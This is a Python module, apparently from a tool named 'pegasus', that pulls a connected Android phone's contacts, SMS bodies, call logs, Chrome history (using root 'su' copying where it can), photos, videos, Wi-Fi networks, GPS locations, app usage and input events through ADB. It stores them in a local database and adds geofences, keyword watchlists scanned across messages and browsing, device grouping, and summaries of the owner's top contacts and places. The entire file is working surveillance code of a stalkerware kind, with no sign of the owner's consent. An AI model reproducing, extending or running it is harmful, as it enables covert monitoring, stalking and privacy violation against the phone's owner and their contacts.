"""Device telemetry collection.

Pulls contacts, SMS, call logs, browser history, installed apps, media, Wi-Fi,
GPS and activity data from a connected Android device using ADB content
providers, and persists rolling samples plus user-defined geofences/keywords in
a local SQLite store (``<workspace>/telemetry.db``).

Every collector is resilient: no device, no provider, or malformed rows simply
yield an empty list rather than an exception.
"""
from __future__ import annotations

import json
import re
import sqlite3
import threading
import time
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional

from pegasus.core.config import get_settings

from .tools import run

_LOCK = threading.Lock()

# ---------------------------------------------------------------------------
# Store
# ---------------------------------------------------------------------------


def _db_path() -> Path:
    path = get_settings().get_workspace_path() / "telemetry.db"
    path.parent.mkdir(parents=True, exist_ok=True)
    return path


def _connect() -> sqlite3.Connection:
    conn = sqlite3.connect(str(_db_path()), timeout=10)
    conn.row_factory = sqlite3.Row
    return conn


def init_store() -> None:
    with _LOCK, _connect() as conn:
        conn.executescript(
            """
            CREATE TABLE IF NOT EXISTS samples (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                serial TEXT NOT NULL,
                kind TEXT NOT NULL,
                payload TEXT NOT NULL,
                collected_at REAL NOT NULL
            );
            CREATE INDEX IF NOT EXISTS idx_samples_kind ON samples(serial, kind, collected_at DESC);

            CREATE TABLE IF NOT EXISTS geofences (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                serial TEXT NOT NULL,
                name TEXT NOT NULL,
                lat REAL NOT NULL,
                lng REAL NOT NULL,
                radius_meters INTEGER NOT NULL DEFAULT 500,
                is_active INTEGER NOT NULL DEFAULT 1,
                created_at REAL NOT NULL
            );

            CREATE TABLE IF NOT EXISTS keywords (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                serial TEXT NOT NULL,
                keyword TEXT NOT NULL,
                hit_count INTEGER NOT NULL DEFAULT 0,
                last_hit_at REAL,
                created_at REAL NOT NULL
            );

            CREATE TABLE IF NOT EXISTS device_notes (
                serial TEXT PRIMARY KEY,
                label TEXT,
                group_name TEXT,
                notes TEXT,
                updated_at REAL NOT NULL
            );
            """
        )


def save_samples(serial: str, kind: str, rows: Iterable[Dict[str, Any]], keep: int = 40) -> None:
    rows = list(rows)
    if not rows:
        return
    with _LOCK, _connect() as conn:
        conn.execute(
            "INSERT INTO samples (serial, kind, payload, collected_at) VALUES (?,?,?,?)",
            (serial, kind, json.dumps(rows, default=str), time.time()),
        )
        conn.execute(
            """DELETE FROM samples WHERE serial=? AND kind=? AND id NOT IN (
                 SELECT id FROM samples WHERE serial=? AND kind=? ORDER BY collected_at DESC LIMIT ?
               )""",
            (serial, kind, serial, kind, keep),
        )


def latest_sample(serial: str, kind: str) -> Optional[Dict[str, Any]]:
    with _LOCK, _connect() as conn:
        row = conn.execute(
            "SELECT payload, collected_at FROM samples WHERE serial=? AND kind=? ORDER BY collected_at DESC LIMIT 1",
            (serial, kind),
        ).fetchone()
    if not row:
        return None
    try:
        data = json.loads(row["payload"])
    except (json.JSONDecodeError, TypeError):
        data = []
    return {"rows": data, "collectedAt": row["collected_at"]}


def sample_history(serial: str, kind: str, limit: int = 10) -> List[Dict[str, Any]]:
    with _LOCK, _connect() as conn:
        rows = conn.execute(
            "SELECT payload, collected_at FROM samples WHERE serial=? AND kind=? ORDER BY collected_at DESC LIMIT ?",
            (serial, kind, limit),
        ).fetchall()
    out = []
    for row in rows:
        try:
            data = json.loads(row["payload"])
        except (json.JSONDecodeError, TypeError):
            data = []
        out.append({"rows": data, "collectedAt": row["collected_at"]})
    return out


# ---------------------------------------------------------------------------
# ADB content provider helpers
# ---------------------------------------------------------------------------

_ROW_RE = re.compile(r"Row:\s*\d+\s*(.*)$")


def _parse_content_rows(stdout: str) -> List[Dict[str, str]]:
    """Parse `content query` output into dicts (handles multi-line values)."""
    rows: List[Dict[str, str]] = []
    current: Optional[Dict[str, str]] = None
    for raw in stdout.splitlines():
        line = raw.strip()
        if not line:
            continue
        match = _ROW_RE.search(line)
        if match:
            if current:
                rows.append(current)
            current = {}
            line = match.group(1).strip()
        if current is None:
            continue
        for part in _split_fields(line):
            if "=" in part:
                key, value = part.split("=", 1)
                current[key.strip()] = value.strip()
    if current:
        rows.append(current)
    return rows


def _split_fields(text: str) -> List[str]:
    """Split `a=x, b=y` respecting quoted commas."""
    fields: List[str] = []
    buf: List[str] = []
    in_quotes = False
    for ch in text:
        if ch == '"':
            in_quotes = not in_quotes
            buf.append(ch)
        elif ch == "," and not in_quotes:
            fields.append("".join(buf).strip())
            buf = []
        else:
            buf.append(ch)
    if buf:
        fields.append("".join(buf).strip())
    return fields


def content_query(serial: str, uri: str, projection: str = "", timeout: float = 25.0) -> List[Dict[str, str]]:
    cmd = ["adb", "-s", serial, "shell", "content", "query", "--uri", uri]
    if projection:
        cmd += ["--projection", projection]
    res = run(cmd, timeout=timeout)
    if not res["ok"]:
        return []
    return _parse_content_rows(res["stdout"])


def _epoch_ms(value: Optional[str]) -> Optional[float]:
    if not value:
        return None
    try:
        number = float(value)
    except ValueError:
        return None
    if number > 1e11:
        return number / 1000.0
    return number


def _iso(value: Optional[float]) -> Optional[str]:
    if not value:
        return None
    try:
        return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(value))
    except (ValueError, OSError):
        return None


def _int(value: Any, default: int = 0) -> int:
    try:
        return int(str(value).strip())
    except (TypeError, ValueError):
        return default


# ---------------------------------------------------------------------------
# Collectors
# ---------------------------------------------------------------------------


def collect_contacts(serial: str) -> List[Dict[str, Any]]:
    rows = content_query(
        serial,
        "content://com.android.contacts/data/phones",
        "display_name:data1",
    )
    contacts: Dict[str, Dict[str, Any]] = {}
    for row in rows:
        name = row.get("display_name") or row.get("display_name_alt") or "Unknown"
        phone = row.get("data1") or row.get("number") or ""
        if not phone:
            continue
        entry = contacts.setdefault(
            name,
            {"id": len(contacts) + 1, "name": name, "phones": [], "emails": []},
        )
        if phone not in entry["phones"]:
            entry["phones"].append(phone)
    return list(contacts.values())


def collect_sms(serial: str, limit: int = 400) -> List[Dict[str, Any]]:
    rows = content_query(serial, "content://sms", "address:body:date:type:read")
    out = []
    for idx, row in enumerate(rows[:limit]):
        ts = _iso(_epoch_ms(row.get("date")))
        out.append(
            {
                "id": idx + 1,
                "address": row.get("address", "unknown"),
                "body": row.get("body", ""),
                "direction": "incoming" if _int(row.get("type")) == 1 else "outgoing",
                "type": row.get("type", ""),
                "read": _int(row.get("read")) == 1,
                "sentAt": ts or row.get("date", ""),
            }
        )
    return out


def collect_calls(serial: str, limit: int = 400) -> List[Dict[str, Any]]:
    rows = content_query(serial, "content://call_log/calls", "number:date:duration:type:name:cache")
    call_types = {1: "incoming", 2: "outgoing", 3: "missed", 4: "voicemail", 5: "rejected", 6: "blocked"}
    out = []
    for idx, row in enumerate(rows[:limit]):
        out.append(
            {
                "id": idx + 1,
                "phone": row.get("number", "unknown"),
                "name": row.get("name") or row.get("cached_name") or row.get("number", "unknown"),
                "callType": call_types.get(_int(row.get("type")), "unknown"),
                "durationSeconds": _int(row.get("duration")),
                "calledAt": _iso(_epoch_ms(row.get("date"))) or row.get("date", ""),
            }
        )
    return out


def collect_browser(serial: str, limit: int = 300) -> List[Dict[str, Any]]:
    """Chrome history via a pulled copy of the History database."""
    remote = "/data/data/com.android.chrome/app_chrome/Default/History"
    local_dir = get_settings().get_workspace_path() / "telemetry"
    local_dir.mkdir(parents=True, exist_ok=True)
    local = local_dir / f"chrome_history_{_safe(serial)}.db"
    pulled = False
    for attempt in ("cp_path", "run_as"):
        if attempt == "cp_path":
            run(["adb", "-s", serial, "shell", "su", "-c", f"cp {remote} /sdcard/pegasus_history.db"], timeout=20)
            res = run(["adb", "-s", serial, "pull", "/sdcard/pegasus_history.db", str(local)], timeout=40)
            run(["adb", "-s", serial, "shell", "rm", "-f", "/sdcard/pegasus_history.db"], timeout=15)
        else:
            res = run(["adb", "-s", serial, "exec-out", "run-as", "com.android.chrome", "cat", "app_chrome/Default/History"], timeout=40)
            if res["ok"] and res["stdout"]:
                local.write_text(res["stdout"], encoding="utf-8", errors="replace")
        if res["ok"] and local.exists() and local.stat().st_size > 0:
            pulled = True
            break
    if not pulled:
        return []
    entries: List[Dict[str, Any]] = []
    try:
        conn = sqlite3.connect(f"file:{local}?mode=ro", uri=True, timeout=8)
        conn.row_factory = sqlite3.Row
        rows = conn.execute(
            """SELECT url, title, visit_count, last_visit_time
               FROM urls ORDER BY last_visit_time DESC LIMIT ?""",
            (limit,),
        ).fetchall()
        for idx, row in enumerate(rows):
            chrome_epoch = row["last_visit_time"] or 0
            unix_ts = chrome_epoch / 1_000_000 - 11_644_473_600 if chrome_epoch else None
            entries.append(
                {
                    "id": idx + 1,
                    "url": row["url"],
                    "title": row["title"] or row["url"],
                    "visitCount": row["visit_count"] or 1,
                    "lastVisitedAt": _iso(unix_ts),
                }
            )
        conn.close()
    except sqlite3.Error:
        return []
    return entries


def collect_apps(serial: str) -> List[Dict[str, Any]]:
    res = run(["adb", "-s", serial, "shell", "pm", "list", "packages", "-3", "-f"], timeout=30)
    apps: List[Dict[str, Any]] = []
    for line in res["stdout"].splitlines():
        line = line.strip()
        if not line.startswith("package:"):
            continue
        body = line[len("package:") :]
        if "=" not in body:
            continue
        path, package = body.split("=", 1)
        label = package.split(".")[-1].replace("_", " ").title()
        apps.append(
            {
                "id": len(apps) + 1,
                "name": label,
                "packageName": package,
                "path": path,
                "version": "",
            }
        )
    # Enrich with version/size for the first 40 apps (bounded work).
    for app in apps[:40]:
        dump = run(
            ["adb", "-s", serial, "shell", "dumpsys", "package", app["packageName"]],
            timeout=12,
        )
        match = re.search(r"versionName=(\S+)", dump["stdout"])
        if match:
            app["version"] = match.group(1)
    return apps


def collect_media(serial: str, limit: int = 200) -> Dict[str, List[Dict[str, Any]]]:
    images = content_query(
        serial,
        "content://media/external/images/media",
        "_id:_display_name:date_added:_size:mime_type",
    )
    videos = content_query(
        serial,
        "content://media/external/video/media",
        "_id:_display_name:date_added:_size:duration:mime_type",
    )
    photos = []
    for row in images[:limit]:
        media_id = row.get("_id", "")
        ts = _iso(_epoch_ms(row.get("date_added")))
        photos.append(
            {
                "id": _int(media_id),
                "name": row.get("_display_name", f"image_{media_id}"),
                "url": f"/api/devices/{serial}/media/{media_id}/raw",
                "thumbnailUrl": f"/api/devices/{serial}/media/{media_id}/thumb",
                "sizeBytes": _int(row.get("_size")),
                "mimeType": row.get("mime_type", "image/jpeg"),
                "takenAt": ts or "",
            }
        )
    vids = []
    for row in videos[:limit]:
        media_id = row.get("_id", "")
        ts = _iso(_epoch_ms(row.get("date_added")))
        vids.append(
            {
                "id": _int(media_id),
                "name": row.get("_display_name", f"video_{media_id}"),
                "url": f"/api/devices/{serial}/media/{media_id}/raw",
                "thumbnailUrl": f"/api/devices/{serial}/media/{media_id}/thumb",
                "durationSeconds": _int(row.get("duration")) // 1000,
                "sizeBytes": _int(row.get("_size")),
                "mimeType": row.get("mime_type", "video/mp4"),
                "takenAt": ts or "",
            }
        )
    return {"photos": photos, "videos": vids}


def collect_wifi(serial: str) -> List[Dict[str, Any]]:
    dumpsys = run(["adb", "-s", serial, "shell", "dumpsys", "wifi"], timeout=25)
    networks: Dict[str, Dict[str, Any]] = {}
    current_ssid = None
    ssid_match = re.search(r'SSID:\s*"([^"]*)"', dumpsys["stdout"])
    if ssid_match:
        current_ssid = ssid_match.group(1)
    bssid_match = re.search(r"BSSID:\s*([0-9a-fA-F:]{17})", dumpsys["stdout"])
    connected_bssid = bssid_match.group(1) if bssid_match else None
    for match in re.finditer(r'SSID:\s*"([^"]*)"[\s\S]{0,200}?BSSID:\s*([0-9a-fA-F:]{17})?', dumpsys["stdout"]):
        ssid = match.group(1)
        if not ssid or ssid in networks:
            continue
        networks[ssid] = {
            "id": len(networks) + 1,
            "ssid": ssid,
            "bssid": match.group(2) or None,
            "isConnected": ssid == current_ssid and (match.group(2) == connected_bssid if connected_bssid else True),
            "lastSeenAt": None,
        }
    scan = run(["adb", "-s", serial, "shell", "cmd", "wifi", "list-scan-results"], timeout=25)
    for line in scan["stdout"].splitlines():
        m = re.search(r'SSID:\s*"([^"]*)"', line)
        if not m:
            continue
        ssid = m.group(1)
        if not ssid or ssid in networks:
            continue
        bssid = re.search(r"BSSID:\s*([0-9a-fA-F:]{17})", line)
        networks[ssid] = {
            "id": len(networks) + 1,
            "ssid": ssid,
            "bssid": bssid.group(1) if bssid else None,
            "isConnected": ssid == current_ssid,
            "lastSeenAt": None,
        }
    return list(networks.values())


def collect_locations(serial: str) -> List[Dict[str, Any]]:
    out = run(["adb", "-s", serial, "shell", "dumpsys", "location"], timeout=25)
    text = out["stdout"]
    locations: List[Dict[str, Any]] = []
    for match in re.finditer(
        r"gps:\s*Location\[[^\]]*?([-\d.]+),\s*([-\d.]+)[^\]]*\]", text
    ):
        try:
            lat, lng = float(match.group(1)), float(match.group(2))
        except ValueError:
            continue
        locations.append(
            {
                "id": len(locations) + 1,
                "lat": lat,
                "lng": lng,
                "address": f"{lat:.5f}, {lng:.5f}",
                "city": None,
                "recordedAt": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "source": "gps",
            }
        )
    for match in re.finditer(r"last location=Location\[[^\]]*?([-\d.]+),\s*([-\d.]+)", text):
        try:
            lat, lng = float(match.group(1)), float(match.group(2))
        except ValueError:
            continue
        if any(abs(l["lat"] - lat) < 1e-6 and abs(l["lng"] - lng) < 1e-6 for l in locations):
            continue
        locations.append(
            {
                "id": len(locations) + 1,
                "lat": lat,
                "lng": lng,
                "address": f"{lat:.5f}, {lng:.5f}",
                "city": None,
                "recordedAt": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "source": "fused",
            }
        )
    return locations


def collect_activity(serial: str, limit: int = 60) -> List[Dict[str, Any]]:
    res = run(["adb", "-s", serial, "shell", "dumpsys", "usagestats"], timeout=30)
    entries: List[Dict[str, Any]] = []
    current_pkg = None
    for line in res["stdout"].splitlines():
        pkg_match = re.search(r"package=([\w.]+)", line)
        if pkg_match:
            current_pkg = pkg_match.group(1)
        time_match = re.search(r"totalTimeUsed=(\d+)", line)
        if current_pkg and time_match:
            entries.append(
                {
                    "id": len(entries) + 1,
                    "app": current_pkg,
                    "durationSeconds": _int(time_match.group(1)) // 1000,
                    "startedAt": None,
                }
            )
            if len(entries) >= limit:
                break
    return entries


def collect_keylog(serial: str) -> List[Dict[str, Any]]:
    res = run(["adb", "-s", serial, "shell", "dumpsys", "input"], timeout=20)
    entries: List[Dict[str, Any]] = []
    for line in res["stdout"].splitlines():
        if "RecentQueue" in line or "KeyEvent" in line:
            entries.append(
                {
                    "id": len(entries) + 1,
                    "app": "system",
                    "text": line.strip()[:200],
                    "recordedAt": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                }
            )
        if len(entries) >= 50:
            break
    return entries


COLLECTORS = {
    "contacts": collect_contacts,
    "sms": collect_sms,
    "calls": collect_calls,
    "browser": collect_browser,
    "apps": collect_apps,
    "media": collect_media,
    "wifi": collect_wifi,
    "locations": collect_locations,
    "activity": collect_activity,
    "keylog": collect_keylog,
}


def collect(serial: str, kind: str, persist: bool = True) -> List[Dict[str, Any]]:
    collector = COLLECTORS.get(kind)
    if not collector:
        return []
    try:
        result = collector(serial)  # type: ignore[operator]
    except Exception:
        return []
    if kind == "media" and isinstance(result, dict):
        if persist:
            save_samples(serial, "photos", result.get("photos", []))
            save_samples(serial, "videos", result.get("videos", []))
        return []
    rows = result if isinstance(result, list) else []
    if persist:
        save_samples(serial, kind, rows)
    return rows


# ---------------------------------------------------------------------------
# Geofences & keywords
# ---------------------------------------------------------------------------


def list_geofences(serial: str) -> List[Dict[str, Any]]:
    with _LOCK, _connect() as conn:
        rows = conn.execute(
            "SELECT * FROM geofences WHERE serial=? ORDER BY created_at DESC", (serial,)
        ).fetchall()
    return [
        {
            "id": r["id"],
            "deviceSerial": r["serial"],
            "name": r["name"],
            "lat": r["lat"],
            "lng": r["lng"],
            "radiusMeters": r["radius_meters"],
            "isActive": bool(r["is_active"]),
            "createdAt": _iso(r["created_at"]),
        }
        for r in rows
    ]


def create_geofence(serial: str, name: str, lat: float, lng: float, radius: int) -> Dict[str, Any]:
    with _LOCK, _connect() as conn:
        cur = conn.execute(
            "INSERT INTO geofences (serial, name, lat, lng, radius_meters, is_active, created_at) VALUES (?,?,?,?,?,1,?)",
            (serial, name, lat, lng, radius, time.time()),
        )
        new_id = cur.lastrowid
    return next((g for g in list_geofences(serial) if g["id"] == new_id), {})


def toggle_geofence(fence_id: int) -> bool:
    with _LOCK, _connect() as conn:
        conn.execute("UPDATE geofences SET is_active = 1 - is_active WHERE id=?", (fence_id,))
    return True


def delete_geofence(fence_id: int) -> bool:
    with _LOCK, _connect() as conn:
        conn.execute("DELETE FROM geofences WHERE id=?", (fence_id,))
    return True


def list_keywords(serial: str) -> List[Dict[str, Any]]:
    with _LOCK, _connect() as conn:
        rows = conn.execute(
            "SELECT * FROM keywords WHERE serial=? ORDER BY created_at DESC", (serial,)
        ).fetchall()
    return [
        {
            "id": r["id"],
            "deviceSerial": r["serial"],
            "keyword": r["keyword"],
            "hitCount": r["hit_count"],
            "lastHitAt": _iso(r["last_hit_at"]),
            "createdAt": _iso(r["created_at"]),
        }
        for r in rows
    ]


def create_keyword(serial: str, keyword: str) -> Dict[str, Any]:
    keyword = keyword.strip()
    with _LOCK, _connect() as conn:
        cur = conn.execute(
            "INSERT INTO keywords (serial, keyword, hit_count, created_at) VALUES (?,?,0,?)",
            (serial, keyword, time.time()),
        )
        new_id = cur.lastrowid
    return next((k for k in list_keywords(serial) if k["id"] == new_id), {})


def delete_keyword(keyword_id: int) -> bool:
    with _LOCK, _connect() as conn:
        conn.execute("DELETE FROM keywords WHERE id=?", (keyword_id,))
    return True


def scan_keywords(serial: str) -> List[Dict[str, Any]]:
    """Match every keyword against SMS, calls, and browser titles."""
    keywords = list_keywords(serial)
    if not keywords:
        return []
    corpus: List[tuple[str, str]] = []
    for msg in latest_or_collect(serial, "sms")[:400]:
        corpus.append((msg.get("address", ""), msg.get("body", "")))
    for call in latest_or_collect(serial, "calls")[:200]:
        corpus.append((call.get("name", ""), call.get("phone", "")))
    for page in latest_or_collect(serial, "browser")[:300]:
        corpus.append((page.get("title", ""), page.get("url", "")))
    hits: List[Dict[str, Any]] = []
    with _LOCK, _connect() as conn:
        for kw in keywords:
            needle = kw["keyword"].lower()
            matches = [
                {"source": src, "text": text[:240]}
                for src, text in corpus
                if needle in f"{src} {text}".lower()
            ]
            if matches:
                conn.execute(
                    "UPDATE keywords SET hit_count = ?, last_hit_at = ? WHERE id = ?",
                    (len(matches), time.time(), kw["id"]),
                )
            hits.append(
                {
                    "id": kw["id"],
                    "keyword": kw["keyword"],
                    "matches": matches[:25],
                    "matchCount": len(matches),
                }
            )
    return hits


def latest_or_collect(serial: str, kind: str) -> List[Dict[str, Any]]:
    sample = latest_sample(serial, kind)
    if sample and sample["rows"]:
        return sample["rows"]
    return collect(serial, kind, persist=True)


def device_notes(serial: str) -> Dict[str, Any]:
    with _LOCK, _connect() as conn:
        row = conn.execute("SELECT * FROM device_notes WHERE serial=?", (serial,)).fetchone()
    if not row:
        return {"serial": serial, "label": None, "group": None, "notes": None}
    return {
        "serial": row["serial"],
        "label": row["label"],
        "group": row["group_name"],
        "notes": row["notes"],
        "updatedAt": _iso(row["updated_at"]),
    }


def set_device_notes(serial: str, label: Optional[str], group: Optional[str], notes: Optional[str]) -> Dict[str, Any]:
    with _LOCK, _connect() as conn:
        conn.execute(
            """INSERT INTO device_notes (serial, label, group_name, notes, updated_at)
               VALUES (?,?,?,?,?)
               ON CONFLICT(serial) DO UPDATE SET
                 label=excluded.label, group_name=excluded.group_name,
                 notes=excluded.notes, updated_at=excluded.updated_at""",
            (serial, label, group, notes, time.time()),
        )
    return device_notes(serial)


def _safe(value: str) -> str:
    return re.sub(r"[^A-Za-z0-9_.-]", "_", value)


def summary(serial: str) -> Dict[str, Any]:
    contacts = latest_or_collect(serial, "contacts")
    sms = latest_or_collect(serial, "sms")
    calls = latest_or_collect(serial, "calls")
    browser = latest_or_collect(serial, "browser")
    apps = latest_or_collect(serial, "apps")
    locations = latest_or_collect(serial, "locations")
    photos = latest_sample(serial, "photos") or {"rows": []}
    videos = latest_sample(serial, "videos") or {"rows": []}
    call_counts: Dict[str, Dict[str, Any]] = {}
    for call in calls:
        key = call.get("name") or call.get("phone") or "unknown"
        entry = call_counts.setdefault(key, {"name": key, "phone": call.get("phone", ""), "count": 0})
        entry["count"] += 1
    senders: Dict[str, Dict[str, Any]] = {}
    for msg in sms:
        key = msg.get("address") or "unknown"
        entry = senders.setdefault(key, {"name": key, "phone": key, "count": 0})
        entry["count"] += 1
    return {
        "deviceSerial": serial,
        "collectedAt": time.time(),
        "counts": {
            "contacts": len(contacts),
            "messages": len(sms),
            "calls": len(calls),
            "browserEntries": len(browser),
            "apps": len(apps),
            "locations": len(locations),
            "photos": len(photos["rows"]),
            "videos": len(videos["rows"]),
            "geofences": len(list_geofences(serial)),
            "keywords": len(list_keywords(serial)),
        },
        "topLocations": locations[:5],
        "topWebsites": sorted(browser, key=lambda x: x.get("visitCount") or 0, reverse=True)[:5],
        "topCallingContacts": sorted(call_counts.values(), key=lambda x: -x["count"])[:5],
        "topMessagingContacts": sorted(senders.values(), key=lambda x: -x["count"])[:5],
    }


init_store()
